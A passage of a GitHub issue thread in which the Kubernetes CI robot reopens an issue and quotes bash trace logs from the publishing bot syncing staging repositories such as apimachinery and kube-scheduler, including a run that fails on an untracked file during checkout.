for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\tFixing up godeps after a complete sync\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' 3dcf91f64f638563e5106f21f50c31fa361c918d '!=' 3dcf91f64f638563e5106f21f50c31fa361c918d ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t+ local k_last_kube_commit=5f6008cadc6e03bf1c84cae2ef4c239d2a111006\n>\t+ '[' -z 5f6008cadc6e03bf1c84cae2ef4c239d2a111006 ']'\n>\t++ git-find-merge 5f6008cadc6e03bf1c84cae2ef4c239d2a111006 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '5f6008cadc6e03bf1c84cae2ef4c239d2a111006^1..upstream-branch' --first-parent\n>\t+++ git rev-list 5f6008cadc6e03bf1c84cae2ef4c239d2a111006..upstream-branch --ancestry-path\n>\t+++ git rev-parse 5f6008cadc6e03bf1c84cae2ef4c239d2a111006\n>\t+ local k_last_kube_merge=5f6008cadc6e03bf1c84cae2ef4c239d2a111006\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' false = true ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 3dcf91f64f638563e5106f21f50c31fa361c918d\n>\tRemove redundant godep commits on-top of 3dcf91f64f638563e5106f21f50c31fa361c918d.\n>\t+ echo 'Remove redundant godep commits on-top of 3dcf91f64f638563e5106f21f50c31fa361c918d.'\n>\t+ git reset --soft -q 3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ local repo=code-generator\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'bfb675c Merge pull request #67655 from sttts/sttts-apiextensions-apiserver-codegen-script' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-release-1.12\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-code-generator-release-1.12.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.12\n>\t+ '[' 3dcf91f64f638563e5106f21f50c31fa361c918d '!=' 3dcf91f64f638563e5106f21f50c31fa361c918d ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[06 Oct 18 08:32 UTC]: Successfully constructed release-1.12\n>[06 Oct 18 08:32 UTC]: Successfully ensured /go-workspace/src/k8s.io/apimachinery exists\n>[06 Oct 18 08:32 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[06 Oct 18 08:32 UTC]: /publish_scripts/construct.sh apimachinery master master   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/apimachinery kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  bc135bd328221b84b7fa9b553507936f016bbfe3\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=apimachinery\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/apimachinery\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=bc135bd328221b84b7fa9b553507936f016bbfe3\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q e65edc4ced47a9ae9b5ae9c1c193dba1a5827b62\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\tSwitching to origin/master.\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=664d79724554e8a3b660ec33eabd23f16fbd7765\n>\t+ '[' 664d79724554e8a3b660ec33eabd23f16fbd7765 '!=' bc135bd328221b84b7fa9b553507936f016bbfe3 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''bc135bd328221b84b7fa9b553507936f016bbfe3'\\'' to '\\''664d79724554e8a3b660ec33eabd23f16fbd7765'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from 'bc135bd328221b84b7fa9b553507936f016bbfe3' to '664d79724554e8a3b660ec33eabd23f16fbd7765'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/apimachinery master master '' '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/apimachinery\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\te65edc4ced47a9ae9b5ae9c1c193dba1a5827b62\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit e65edc4ced47a9ae9b5ae9c1c193dba1a5827b62.\n>\t+ echo 'Starting at existing master commit e65edc4ced47a9ae9b5ae9c1c193dba1a5827b62.'\n>\t+ git branch -D filtered-branch\n>\terror: branch 'filtered-branch' not found.\n>\t+ true\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 664d79724554e8a3b660ec33eabd23f16fbd7765.\n>\t+ echo 'Checked out source commit 664d79724554e8a3b660ec33eabd23f16fbd7765.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\terror: The following untracked working tree files would be overwritten by checkout:\n>\t\tthird_party/etcd.BUILD\n>\tPlease move or remove them before you can switch branches.\n>\tAborting\n>[06 Oct 18 08:32 UTC]: exit status 1\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=apimachinery\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/apimachinery\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=bc135bd328221b84b7fa9b553507936f016bbfe3\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q e65edc4ced47a9ae9b5ae9c1c193dba1a5827b62\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=664d79724554e8a3b660ec33eabd23f16fbd7765\n>    \t+ '[' 664d79724554e8a3b660ec33eabd23f16fbd7765 '!=' bc135bd328221b84b7fa9b553507936f016bbfe3 ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''bc135bd328221b84b7fa9b553507936f016bbfe3'\\'' to '\\''664d79724554e8a3b660ec33eabd23f16fbd7765'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/apimachinery master master '' '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/apimachinery\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 10 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit e65edc4ced47a9ae9b5ae9c1c193dba1a5827b62.'\n>    \t+ git branch -D filtered-branch\n>    \terror: branch 'filtered-branch' not found.\n>    \t+ true\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 664d79724554e8a3b660ec33eabd23f16fbd7765.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \terror: The following untracked working tree files would be overwritten by checkout:\n>    \t\tthird_party/etcd.BUILD\n>    \tPlease move or remove them before you can switch branches.\n>    \tAborting\n>\n>[06 Oct 18 08:32 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-428103267):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>...e-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' 243557ba3da96995db4f8efbc756fc935d074739 '!=' 243557ba3da96995db4f8efbc756fc935d074739 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=4bc03d2cec8fdc97c3ba10f513172bacc7a40af8\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kubelet-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kubelet-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kubelet-release-1.12.sh --dependencies apimachinery:release-1.12,api:release-1.12 --mapping-output-file '../tag-kubelet-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at 4bc03d2cec8fdc97c3ba10f513172bacc7a40af8 because \"kubernetes-1.11.0-alpha.1\" seems to be relevant.\n>\t++ git rev-parse release-1.12\n>\t+ '[' 4bc03d2cec8fdc97c3ba10f513172bacc7a40af8 '!=' 4bc03d2cec8fdc97c3ba10f513172bacc7a40af8 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[09 Oct 18 08:16 UTC]: Successfully constructed release-1.12\n>[09 Oct 18 08:16 UTC]: Successfully ensured /go-workspace/src/k8s.io/kube-scheduler exists\n>[09 Oct 18 08:16 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Oct 18 08:16 UTC]: /publish_scripts/construct.sh kube-scheduler master master apimachinery:master,apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-scheduler kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  a34123d9c3e933b662bf0a3cb2c427f774154b01\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-scheduler\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-scheduler\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=a34123d9c3e933b662bf0a3cb2c427f774154b01\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=f9acfd8e384488d2216b18196152dcb7b3cc92d8\n>\t+ '[' f9acfd8e384488d2216b18196152dcb7b3cc92d8 '!=' a34123d9c3e933b662bf0a3cb2c427f774154b01 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''a34123d9c3e933b662bf0a3cb2c427f774154b01'\\'' to '\\''f9acfd8e384488d2216b18196152dcb7b3cc92d8'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from 'a34123d9c3e933b662bf0a3cb2c427f774154b01' to 'f9acfd8e384488d2216b18196152dcb7b3cc92d8'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/kube-scheduler master master apimachinery:master,apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/kube-scheduler\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 9 = 0 ']'\n>\t++ git rev-parse HEAD\n>\t+ echo 'Starting at existing master commit 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2.'\n>\t+ git branch -D filtered-branch\n>\tStarting at existing master commit 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2.\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit f9acfd8e384488d2216b18196152dcb7b3cc92d8.\n>\t+ echo 'Checked out source commit f9acfd8e384488d2216b18196152dcb7b3cc92d8.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t++ git-find-merge a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list 'a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50..upstream/master --ancestry-path\n>\t+++ git rev-parse a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local k_base_merge=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t+ git branch -f filtered-branch-base a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/kube-scheduler.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/kube-scheduler.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/kube-scheduler 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/kube-scheduler\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\tRunning git filter-branch ...\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/kube-scheduler -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=a0ae31695b456bef5c4ee1597afd9934e8b9b019\n>\t++ git log --first-parent --format=%H --reverse 